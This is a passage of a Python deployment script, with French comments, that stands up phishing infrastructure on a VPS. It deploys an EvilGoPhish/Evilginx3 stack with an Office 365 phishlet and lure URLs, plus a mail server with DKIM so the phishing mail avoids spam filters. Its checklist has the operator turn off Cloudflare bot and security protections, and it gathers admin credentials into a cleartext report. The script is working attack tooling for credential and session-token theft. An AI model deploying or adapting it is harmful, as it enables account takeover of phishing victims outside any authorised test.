    pfa    = c.get("mail", "port_postfixadmin", default=8026)
    rc     = c.get("mail", "port_roundcube", default=8025)
    phish  = c.get("evilgophish", "phishlet", default="o365")
    lure   = c.get("evilgophish", "lure_path", default="/secure")
    sub0   = subs[0] if subs else "login"

    print(f"""
{C.GRN}{C.BOLD}╔══════════════════════════════════════════════════════════════╗
║               DÉPLOIEMENT TERMINÉ — CHECKLIST POST-DEPLOY    ║
╚══════════════════════════════════════════════════════════════╝{C.RST}

{C.BOLD}1. Cloudflare DNS{C.RST} — créer les records A (proxy orange) :""")
    for sub in subs:
        print(f"   A  {sub:<12} → {ip}  [proxy: ON]")

    print(f"""
{C.BOLD}2. Cloudflare SSL/TLS{C.RST} :
   • Mode        : Full  (pas Flexible, pas Full Strict)
   • Bot Fight   : OFF
   • Security    : Essentially Off

{C.BOLD}3. Accès services{C.RST} :
   • GoPhish     : ssh -L 3333:127.0.0.1:3333 root@{ip} -N
                   → http://localhost:3333
   • PostfixAdmin: ssh -L {pfa}:127.0.0.1:{pfa} root@{ip} -N
                   → http://127.0.0.1:{pfa}
   • Roundcube   : http://{ip}:{rc}

{C.BOLD}4. Vérifier lure Evilginx3{C.RST} :
   curl -skI https://{sub0}.{domain}{lure}
   # Attendu : HTTP/2 302

{C.BOLD}5. URL lure pour GoPhish (template email){C.RST} :
   https://{sub0}.{domain}{lure}?rid={{{{.RId}}}}

{C.BOLD}6. Vérifier cert Origin (direct VPS, bypass CF){C.RST} :
   echo | openssl s_client -connect {ip}:443 -servername {sub0}.{domain} 2>/dev/null \\
     | openssl x509 -noout -issuer
   # Attendu : Issuer=CloudFlare Origin CA
""")


# ══════════════════════════════════════════════════════════════════════════════
#  COLLECTE POST-DÉPLOIEMENT & FICHIER RÉSULTATS
# ══════════════════════════════════════════════════════════════════════════════

def _ssh_exec(c: Config, cmd: str, timeout: int = 20) -> str:
    """Exécute une commande sur le VPS (SSH) ou localement (--local).
    Retourne "" en cas d'erreur ou de timeout — ne lève jamais d'exception."""
    try:
        if c.local:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=timeout)
            return r.stdout.strip() if r.returncode == 0 else ""
        r = subprocess.run(
            [
                "ssh", "-i", c.ssh_key,
                "-p", str(c.ssh_port),
                "-o", "StrictHostKeyChecking=no",
                "-o", "ConnectTimeout=8",
                "-o", "BatchMode=yes",
                f"{c.vps_user}@{c.vps_host}",
                cmd,
            ],
            capture_output=True, text=True, timeout=timeout,
        )
        return r.stdout.strip() if r.returncode == 0 else ""
    except subprocess.TimeoutExpired:
        log_warn(f"Timeout ({timeout}s) — commande ignorée dans collect")
        return ""
    except Exception as e:
        log_warn(f"Erreur collect : {e}")
        return ""


def _parse_dkim_p(dkim_txt: str) -> str:
    """Extrait la valeur p= (clé publique brute) depuis le contenu du fichier {dom}.txt."""
    # Supprimer guillemets, espaces et retours à la ligne pour avoir une chaîne unique
    flat = re.sub(r'[\s"\t]', '', dkim_txt)
    m = re.search(r'p=([A-Za-z0-9+/=]+)', flat)
    return m.group(1) if m else ""


def collect_results(c: Config) -> Optional[Path]:
    """
    Se connecte au VPS via SSH, collecte DKIM + état des services,
    et génère deploy_results_{domain}_{ts}.md dans le répertoire courant.
    """
    if c.dry_run:
        log_warn("[DRY-RUN] collect_results ignoré")
        return None

    log_info("Collecte des informations post-déploiement depuis le VPS...")

    s   = c.smtp_dir
    eg  = c.eg_dir
    dom = c.domain

    # ── 1. DKIM public key (avec retry — le conteneur peut mettre qq secondes) ──
    dkim_txt_raw = ""
    for attempt in range(6):
        dkim_txt_raw = _ssh_exec(c,
            f"cat {s}/dkim/{dom}.txt 2>/dev/null"
        )
        if dkim_txt_raw and "p=" in dkim_txt_raw:
            break
        if attempt < 5:
            log_info(f"DKIM pas encore prêt, attente 10s... ({attempt+1}/5)")
            time.sleep(10)

    # Format DNS complet (une ligne)
    dkim_p_value = _parse_dkim_p(dkim_txt_raw) if dkim_txt_raw else ""
    dkim_dns_record = (
        f"v=DKIM1; k=rsa; p={dkim_p_value}" if dkim_p_value else "NON DISPONIBLE (relancer --collect dans 2 min)"
    )

    # Selector et nom du record DNS
    dkim_selector = "mail"
    dkim_record_name = f"{dkim_selector}._domainkey.{dom}"

    # ── 2. GoPhish — mot de passe initial (affiché dans les logs au 1er démarrage) ──
    gophish_pass_log = _ssh_exec(c,
        "docker exec evilgophish grep -i 'password' /var/log/evilgophish/gophish.log 2>/dev/null | head -3"
    )

    # ── 3. Supervisord status ─────────────────────────────────────────────────
    sv_status = _ssh_exec(c,
        "docker exec evilgophish supervisorctl status 2>/dev/null"
    )

    # ── 4. Docker ps ──────────────────────────────────────────────────────────
    docker_ps = _ssh_exec(c,
        "docker ps --format 'table {{.Names}}\t{{.Status}}\t{{.Ports}}' 2>/dev/null"
    )

    # ── 5. Cert Origin (vérifié directement sur le VPS) ───────────────────────
    sub0 = c.subdomains[0] if c.subdomains else "login"
    cert_info = _ssh_exec(c,
        f"timeout 8 openssl s_client -connect {c.vps_ip}:443 "
        f"-servername {sub0}.{dom} </dev/null 2>/dev/null | "
        f"openssl x509 -noout -issuer -dates 2>/dev/null",
        timeout=15,
    )

    # ── 6. Postfix smtpd_sender_restrictions ──────────────────────────────────
    postfix_restrictions = _ssh_exec(c,
        "docker exec smtp postconf smtpd_sender_restrictions 2>/dev/null"
    )

    # ── 7. Espace disque ──────────────────────────────────────────────────────
    disk_usage = _ssh_exec(c, "df -h / | tail -1")

    # ── Génération du rapport ─────────────────────────────────────────────────
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")

    subs     = c.subdomains
    vps_ip   = c.vps_ip
    pfa_port = c.get("mail", "port_postfixadmin", default=8026)
    rc_port  = c.get("mail", "port_roundcube", default=8025)
    phishlet = c.get("evilgophish", "phishlet", default="o365")
    lure     = c.get("evilgophish", "lure_path", default="/secure")
    lure_url = f"https://{sub0}.{dom}{lure}?rid={{{{.RId}}}}"

    pfa_admin_email = c.get("mail", "postfixadmin_admin_email", default=f"admin@{dom}")
    pfa_admin_pw    = c.get("mail", "postfixadmin_admin_password", default="")
    db_root_pw      = c.get("mail", "db_root_password", default="")
    db_user         = c.get("mail", "db_user", default="mailuser")
    db_pw           = c.get("mail", "db_password", default="")
    db_name         = c.get("mail", "db_name", default="mailserver")
    rc_db_pw        = c.get("mail", "roundcube_db_password", default="")
    mail_deployed   = c.mail_deploy
    eg_deployed     = c.eg_deploy

    # DNS records block
    dns_records = "\n".join(
        f"  A    {sub:<12}  {vps_ip}  [proxy: ON]"
        for sub in subs
    )

    ssh_cmd = f"ssh -i {c.ssh_key} root@{vps_ip}" if c.ssh_key else f"# (déployé en mode --local sur {vps_ip})"

    _eg_section = ""
    if eg_deployed:
        _eg_section = f"""\
| **GoPhish** | `admin` | *(voir logs ci-dessous)* |

GoPhish — logs premier démarrage (mot de passe initial) :
```
{gophish_pass_log or "Non disponible — vérifier : docker exec evilgophish grep -i password /var/log/evilgophish/gophish.log"}
```"""
    else:
        _eg_section = "| **GoPhish** | — | EvilGoPhish non déployé |"

    _eg_access = ""
    if eg_deployed:
        _eg_access = f"""\
### GoPhish (SSH tunnel requis)
```bash
{ssh_cmd} -L 3333:127.0.0.1:3333 -N &
# → http://localhost:3333
```

### Evilginx3 — URL lure GoPhish
```
{lure_url}
```
"""

    _eg_status = ""
    if eg_deployed:
        _eg_status = f"""\
### Supervisord (evilgophish)
```
{sv_status or "Non disponible"}
```

### Cert Origin (direct VPS, bypass Cloudflare)
```
{cert_info or "Non disponible — port 443 non écouté ou Cloudflare pas encore configuré"}
```
"""

    _eg_cmds = ""
    if eg_deployed:
        _eg_cmds = f"""\
# Logs Evilginx3
docker exec evilgophish tail -f /var/log/evilgophish/evilginx3.log

# Logs GoPhish
docker exec evilgophish tail -f /var/log/evilgophish/gophish.log

# Redémarrer Evilginx3
docker exec evilgophish supervisorctl restart evilginx3

# Vérifier cert Origin (bypass CF)
echo | openssl s_client -connect {vps_ip}:443 -servername {sub0}.{dom} 2>/dev/null \\
  | openssl x509 -noout -issuer -dates

# Vérifier lure
curl -skI https://{sub0}.{dom}{lure}
"""

    report = f"""\
# Résultats déploiement — {dom}
> Généré le {now} par deploy_infra.py

---

## 1. Informations générales

| Champ | Valeur |
|-------|--------|
| **Domaine** | `{dom}` |
| **VPS IP** | `{vps_ip}` |
| **Sous-domaines** | `{', '.join(f'{sub}.{dom}' for sub in subs)}` |
| **Mail stack** | `{"déployé" if mail_deployed else "non déployé"}` |
| **EvilGoPhish** | `{"déployé" if eg_deployed else "non déployé"}` |
| **Phishlet actif** | `{phishlet if eg_deployed else "—"}` |
| **Lure path** | `{lure if eg_deployed else "—"}` |

---

## 2. Credentials

### Mail stack
| Service | Compte / Base | Mot de passe |
|---------|--------------|--------------|
| **PostfixAdmin** | `{pfa_admin_email}` | `{pfa_admin_pw}` |
| **Roundcube** | `{pfa_admin_email}` (IMAP) | `{pfa_admin_pw}` |
| **MariaDB root** | `root` | `{db_root_pw}` |
| **MariaDB mailuser** | `{db_user}` @ `{db_name}` | `{db_pw}` |
| **MariaDB roundcube** | `roundcube` @ `roundcube` | `{rc_db_pw}` |

{_eg_section}

---

## 3. DKIM — Record DNS à ajouter dans Cloudflare

> ⚠️ **OBLIGATOIRE** pour que les emails ne partent pas en spam.

| Champ | Valeur |
|-------|--------|
| **Type** | `TXT` |
| **Nom** | `{dkim_record_name}` |
| **Valeur** | *(voir ci-dessous)* |
| **Proxy** | ☁️ OFF (DNS only — nuage gris) |

Valeur TXT complète :
```
{dkim_dns_record}
```

Contenu brut du fichier `{s}/dkim/{dom}.txt` :
```
{dkim_txt_raw or "Non disponible — relancer : python3 deploy_infra.py --collect-only"}
```

Vérification DKIM après ajout DNS :
```bash
dig +short TXT {dkim_record_name} @1.1.1.1
# Attendu : "v=DKIM1; k=rsa; p=..."
```

---

## 4. Records DNS Cloudflare à créer

```
{dns_records}
  A    mail                 {vps_ip}                                       [proxy: OFF]
  MX   @                    mail.{dom}  priorité 10                        [proxy: OFF]
  TXT  _dmarc               "v=DMARC1; p=none; rua=mailto:dmarc@{dom}"    [proxy: OFF]
  TXT  {dkim_selector}._domainkey  "{dkim_dns_record}"                     [proxy: OFF]
```

### Paramètres SSL/TLS Cloudflare

| Paramètre | Valeur |
|-----------|--------|
| Mode SSL | **Full** (pas Full Strict — cert Origin auto-signé) |
| Bot Fight Mode | **OFF** |
| Security Level | **Essentially Off** |

---

## 5. Accès services

{_eg_access}
### PostfixAdmin
```
http://{vps_ip}:{pfa_port}/login.php
```
Login : `{pfa_admin_email}` / `{pfa_admin_pw}`

### Roundcube (webmail)
```
http://{vps_ip}:{rc_port}
```
Login : `{pfa_admin_email}` / `{pfa_admin_pw}`

---

## 6. Créer des comptes mail (PostfixAdmin)

Une fois connecté à PostfixAdmin → Virtual List → Add Mailbox :
```
Domaine  : {dom}
Login    : user@{dom}
Password : (choisir)
```

---

## 7. État des services (au moment du déploiement)

{_eg_status}
### Docker containers
```
{docker_ps or "Non disponible"}
```

### Postfix smtpd_sender_restrictions
```
{postfix_restrictions or "Non disponible"}
```

### Espace disque (/)
```
{disk_usage or "Non disponible"}
```

---

## 8. Commandes utiles

```bash
# Connexion VPS
{ssh_cmd}

# État des conteneurs
docker ps

# Logs Postfix/SMTP
docker logs -f smtp

# Lire clé DKIM (si conteneur démarré)
cat {s}/dkim/{dom}.txt

{_eg_cmds}
# Recollect les infos (DKIM, certs, statuts)
python3 deploy_infra.py --collect-only
```

---

*deploy_infra.py — {dom} — {now}*
"""

    out_path = Path(f"deploy_results_{dom}_{ts}.md")
    out_path.write_text(report)
    log_ok(f"Fichier résultats généré : {C.BOLD}{out_path}{C.RST}")
    return out_path


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="Déploie l'infrastructure phishing (mail + evilgophish) sur un VPS via Ansible.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""
        Exemples :
          python3 deploy_infra.py                                        # Déploiement complet (via SSH)
          python3 deploy_infra.py --local                                # Déployer directement sur ce serveur (sans SSH)
          python3 deploy_infra.py --dry-run                              # Simulation (génère les playbooks sans les exécuter)
          python3 deploy_infra.py --step docker                          # Une seule étape
          python3 deploy_infra.py --from-step mail                       # Reprendre depuis une étape
          python3 deploy_infra.py --list-steps                           # Lister les étapes disponibles
          python3 deploy_infra.py -c autre_config.yml                    # Config alternative

          python3 deploy_infra.py --destroy                              # Supprimer toute l'infra
          python3 deploy_infra.py --destroy --services evilgophish       # Supprimer uniquement evilgophish
          python3 deploy_infra.py --destroy --services mailstack smtp    # Supprimer mail + smtp
          python3 deploy_infra.py --destroy --purge-dirs                 # Supprimer aussi les répertoires
          python3 deploy_infra.py --local --destroy                      # Destroy en local (sans SSH)
        """)
    )
    p.add_argument("-c", "--config",     default="deploy_config.yml",
                   help="Fichier de configuration (défaut: deploy_config.yml)")
    p.add_argument("--dry-run",          action="store_true",
                   help="Génère les artefacts Ansible sans les exécuter")
    p.add_argument("--step",             metavar="STEP",
                   help="Exécuter uniquement cette étape")
    p.add_argument("--from-step",        metavar="STEP",
                   help="Reprendre depuis cette étape (inclus)")
    p.add_argument("--local",            action="store_true",
                   help="Déployer directement sur ce serveur (sans SSH, Ansible connection=local)")
    p.add_argument("--skip-preflight",   action="store_true",
                   help="Ne pas vérifier la connectivité SSH avant le déploiement")
    p.add_argument("--list-steps",       action="store_true",
                   help="Lister les étapes disponibles et quitter")
    p.add_argument("-v", "--verbose",    action="store_true",
                   help="Afficher la sortie Ansible complète")
    p.add_argument("--keep-workspace",   action="store_true",
                   help="Ne pas supprimer le répertoire Ansible temporaire après exécution")
    p.add_argument("--collect-only",     action="store_true",
                   help="Collecter DKIM + résultats depuis un VPS déjà déployé (sans redéployer)")
    # ── Destroy ──────────────────────────────────────────────────────────────
    p.add_argument("--destroy",          action="store_true",
                   help="Supprimer l'infrastructure (conteneurs + images). Tout par défaut.")
    p.add_argument("--services",         nargs="+", metavar="SERVICE",
                   help=f"Services à cibler avec --destroy : {', '.join(ALL_SERVICES)}")
    p.add_argument("--purge-dirs",       action="store_true",
                   help="Avec --destroy : supprimer aussi les répertoires sur le serveur")
    return p.parse_args()


def main():
    args = parse_args()

    if args.list_steps:
        print(f"\n{C.BOLD}Étapes disponibles :{C.RST}")
        for i, name in enumerate(STEP_NAMES, 1):
            print(f"  {i:2}. {name}")
        print()
        sys.exit(0)

    # ── Chargement config ─────────────────────────────────────────────────
    c = Config(args.config)
    if args.dry_run:
        c._raw.setdefault("options", {})["dry_run"] = True
    if args.verbose:
        c._raw.setdefault("options", {})["verbose"] = True
    if args.local:
        c._raw.setdefault("options", {})["local"] = True

    print_banner(c, destroy=args.destroy, services=args.services)

    # ── Mode destroy ──────────────────────────────────────────────────────
    if args.destroy:
        run_destroy(c, args)
        sys.exit(0)

    c.validate()

    # ── Mode collect-only ─────────────────────────────────────────────────
    if args.collect_only:
        check_prerequisites(c)
        if not c.local and not check_vps_connectivity(c):
            die("Impossible de joindre le VPS.")
        result_file = collect_results(c)
        if result_file:
            print(f"\n{C.GRN}{C.BOLD}  → {result_file.resolve()}{C.RST}\n")
        sys.exit(0)

    if not args.skip_preflight:
        check_prerequisites(c)
        if not c.dry_run and not c.local:
            if not check_vps_connectivity(c):
                die("Impossible de joindre le VPS. Vérifiez l'IP, le port SSH et la clé.")

    # ── Workspace Ansible ─────────────────────────────────────────────────
    ws = AnsibleWorkspace(c)
    runner = AnsibleRunner(ws, c)

    try:
        # Générer tous les fichiers de config
        log_info("Génération des fichiers de configuration...")
        ws.prepare_files()
        log_ok("Fichiers générés dans " + str(ws.files_dir))

        # Construire les étapes
        steps = build_steps(c, ws)

        # Filtrer selon --step / --from-step
        if args.step:
            steps = [(n, pb, t) for n, pb, t in steps if n == args.step]
            if not steps:
                die(f"Étape '{args.step}' introuvable. Utilisez --list-steps.")
        elif args.from_step:
            names = [n for n, _, _ in steps]
            if args.from_step not in names:
                die(f"Étape '{args.from_step}' introuvable. Utilisez --list-steps.")
            idx   = names.index(args.from_step)
            steps = steps[idx:]

        total   = len(steps)
        failed  = []
        t_start = time.time()

        for i, (name, playbook, timeout) in enumerate(steps, 1):
            log_step(i, total, name.upper())
            ok = runner.run(playbook, name, timeout=timeout)
            if not ok:
                failed.append(name)
                log_error(f"Étape '{name}' échouée.")
                try:
                    answer = input(f"\n{C.YLW}Continuer malgré l'échec ? [o/N] {C.RST}").strip().lower()
                except EOFError:
                    answer = "n"
                    log_warn("Mode non-interactif — arrêt sur échec.")
                if answer not in ("o", "oui", "y", "yes"):
                    break

        elapsed = time.time() - t_start
        print(f"\n{C.DIM}Durée totale : {elapsed:.0f}s{C.RST}")

        if failed:
            log_error(f"Étapes échouées : {', '.join(failed)}")
            log_warn("Relancez avec --from-step <nom_etape> après correction.")
            # Collecte partielle malgré les erreurs
            if not c.dry_run:
                log_info("Tentative de collecte partielle des résultats disponibles...")
                collect_results(c)
            sys.exit(1)
        else:
            log_ok("Toutes les étapes terminées avec succès.")
            if not c.dry_run:
                print_post_deploy_checklist(c)
                # ── Collecte DKIM + résultats ─────────────────────────────
                log_step(total + 1, total + 1, "COLLECT — DKIM + RÉSULTATS")
                result_file = collect_results(c)
                if result_file:
                    print(f"\n{C.GRN}{C.BOLD}  → Fichier résultats : {result_file.resolve()}{C.RST}\n")

    except KeyboardInterrupt:
        print(f"\n{C.YLW}Interruption clavier — déploiement annulé.{C.RST}")
        sys.exit(130)
    except Exception as e:
        log_error(f"Erreur inattendue : {e}")
        traceback.print_exc()
        sys.exit(1)
    finally:
        if args.keep_workspace:
            log_info(f"Workspace conservé : {ws.dir}")
        else:
            ws.cleanup()


if __name__ == "__main__":
    main()
